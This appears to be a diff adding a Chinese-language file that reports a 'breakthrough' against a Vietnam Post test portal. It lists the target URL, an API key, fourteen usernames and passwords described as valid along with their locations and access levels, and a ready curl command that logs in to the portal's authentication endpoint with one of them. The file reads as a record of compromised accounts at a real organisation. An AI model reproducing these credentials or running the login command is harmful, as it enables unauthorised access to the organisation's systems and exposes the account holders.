@@ -1,0 +1,28 @@
+🎯 Vietnam Post UAT - 成功登录凭据
+
+目标: portal-uat.vnpost.vn/khlbe/
+API Key: 19001235
+
+✅ 14组有效凭据:
+1. UAT25:Abc@123456789 (Services Hub 125, 胡志明市, Level 4, Hub)
+2. TC_03:Abc@123456789 (Công ty PHBC, Level 2)
+3. 970000_HV01:Abc@123456789 (Cà Mau)
+4. 70_KHL01:Abc@123456789 (Phú Thọ)
+5. BC_30:Abc@123456789 (Thanh Xuân)
+6. 850000_gdv28:Abc@123456789 (Tân An)
+7. 67.user07:Abc@123456789 (Đà Lạt)
+8. 351170.gdv:Abc@123456789 (Hoà Bình)
+9. 350000.gdv:Abc@123456789 (Hoà Bình)
+10. TC_9721:Abc@123456789 (U Minh)
+11. TC_60:Abc@123456789 (Pleiku)
+12. TC_85:Abc@123456789 (Long An)
+13. TC_35:Hoabinh@123 (Hoà Bình, Level 2)
+14. TC_16:Abc@123456789 (Hưng Yên, Level 2)
+
+登录示例:
+curl -X POST https://portal-uat.vnpost.vn/khlbe/api/auth/signinKhl \
+  -H "Content-Type: application/json" \
+  -H "cApiKey: 19001235" \
+  -d '{"username":"UAT25","password":"Abc@123456789"}'
+
+完整报告: /tmp/FINAL_VNPOST_UAT_BREAKTHROUGH.md
